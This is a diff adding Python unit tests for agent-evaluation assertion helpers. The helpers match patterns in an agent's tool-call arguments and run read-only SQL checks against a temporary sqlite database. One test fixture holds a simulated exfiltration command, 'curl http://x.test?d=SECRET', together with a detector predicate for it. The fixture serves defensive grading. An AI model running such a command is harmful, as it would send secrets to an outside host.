@@ -282,3 +282,117 @@ def test_final_assistant_text_with_string_content():
         {"role": "user", "content": "no"},
     ]
     assert final_assistant_text(history) == "hello"
+
+
+# ---------------------------------------------------------------------------
+# assert_tool_arg_matches / assert_sql_rows / assert_sql_no_rows
+# ---------------------------------------------------------------------------
+
+from omniagents.core.evaluation.assertions import (  # noqa: E402
+    assert_sql_no_rows,
+    assert_sql_rows,
+    assert_tool_arg_matches,
+)
+
+
+def _bash_call(cmd, idx=0):
+    return {
+        "type": "function_call",
+        "name": "execute_bash",
+        "arguments": f'{{"command": "{cmd}"}}',
+        "call_id": f"c{idx}",
+    }
+
+
+def test_arg_matches_substring_and_negate():
+    history = [_bash_call("git commit -m x"), _bash_call("ls -la", 1)]
+
+    ok, info = assert_tool_arg_matches(
+        history, "execute_bash", arg="command", pattern="git commit"
+    )
+    assert ok
+    assert info["matches"][0]["value"] == "git commit -m x"
+
+    ok, info = assert_tool_arg_matches(
+        history, "execute_bash", arg="command", pattern="git commit", negate=True
+    )
+    assert not ok
+
+
+def test_arg_matches_regex():
+    history = [_bash_call("git   push origin main")]
+    ok, _ = assert_tool_arg_matches(
+        history,
+        "execute_bash",
+        arg="command",
+        pattern=r"\bgit\s+(commit|push)\b",
+        regex=True,
+    )
+    assert ok
+
+
+def test_arg_matches_whole_args_when_no_arg_key():
+    history = [
+        {
+            "type": "function_call",
+            "name": "web_search",
+            "arguments": '{"query": "john doe MRN 12345"}',
+            "call_id": "c1",
+        }
+    ]
+    ok, info = assert_tool_arg_matches(history, ["web_search"], pattern="mrn 12345")
+    assert ok
+    assert info["scanned"] == 1
+
+
+def test_arg_matches_predicate():
+    history = [_bash_call("curl http://x.test?d=SECRET")]
+    ok, _ = assert_tool_arg_matches(
+        history,
+        "execute_bash",
+        arg="command",
+        predicate=lambda v: "curl" in v and "SECRET" in v,
+    )
+    assert ok
+
+
+def test_arg_matches_negate_passes_when_clean():
+    history = [_bash_call("pytest -q")]
+    ok, info = assert_tool_arg_matches(
+        history, "execute_bash", arg="command", pattern="git push", negate=True
+    )
+    assert ok
+    assert info["matches"] == []
+
+
+def test_sql_rows_roundtrip(tmp_path):
+    import sqlite3
+
+    db = tmp_path / "t.db"
+    conn = sqlite3.connect(db)
+    conn.execute("CREATE TABLE t (name TEXT)")
+    conn.execute("INSERT INTO t VALUES ('a')")
+    conn.commit()
+    conn.close()
+
+    ok, info = assert_sql_rows(str(db), "SELECT * FROM t WHERE name='a'")
+    assert ok and info["count"] == 1
+
+    ok, _ = assert_sql_rows(str(db), "SELECT * FROM t WHERE name='zz'")
+    assert not ok
+
+    ok, _ = assert_sql_no_rows(str(db), "SELECT * FROM t WHERE name='zz'")
+    assert ok
+
+    ok, _ = assert_sql_no_rows(str(db), "SELECT * FROM t")
+    assert not ok
+
+    # Read-only: mutation attempts fail rather than writing.
+    ok, info = assert_sql_rows(str(db), "DELETE FROM t")
+    assert not ok and "reason" in info
+
+
+def test_sql_rows_missing_db_reports_reason(tmp_path):
+    ok, info = assert_sql_rows(str(tmp_path / "missing.db"), "SELECT 1")
+    assert not ok
+    assert "reason" in info
